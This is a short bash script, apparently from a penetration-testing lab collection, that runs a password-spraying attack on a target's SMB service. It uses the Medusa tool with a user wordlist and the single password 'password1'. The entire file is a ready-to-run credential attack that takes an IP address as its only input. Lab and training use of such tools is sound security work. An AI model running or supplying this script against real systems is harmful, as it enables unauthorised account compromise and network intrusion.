#!/bin/bash

echo "=== Password Spraying SMB com Medusa ==="

if [ -z "$1" ]; then
    echo "Uso: $0 <IP_ALVO>"
    exit 1
fi

TARGET=$1
USERLIST="../wordlists/users.txt"
PASSWORD="password1"

echo "Alvo: $TARGET"
echo "Userlist: $USERLIST"
echo "Senha testada: $PASSWORD"

medusa -h "$TARGET" -U "$USERLIST" -p "$PASSWORD" -M smbnt
